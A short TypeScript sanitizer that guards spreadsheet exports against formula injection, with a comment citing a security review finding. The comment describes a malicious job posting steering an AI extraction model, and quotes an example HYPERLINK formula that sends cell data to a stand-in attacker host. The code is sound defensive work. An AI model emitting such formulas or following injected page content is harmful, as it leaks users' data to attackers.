// Spreadsheet formula injection guard (security review 2026-07-28, Finding
// #5). company/role_title/salary_range/location/job_link/notes can all
// originate from AI extraction of an arbitrary, attacker-controlled web
// page (extension handoff -> extract-job-details -> saved row) -- a
// malicious posting can make the model return something like
// =HYPERLINK("https://evil.example/?d="&A1,"click") as a "company name",
// which a spreadsheet app executes on open. Prefixing a leading apostrophe
// forces the cell to be read as literal text in both Excel and Sheets.
const FORMULA_PREFIX = /^[=+\-@\t\r]/

export function sanitizeExportField(value: string): string {
  return FORMULA_PREFIX.test(value) ? `'${value}` : value
}
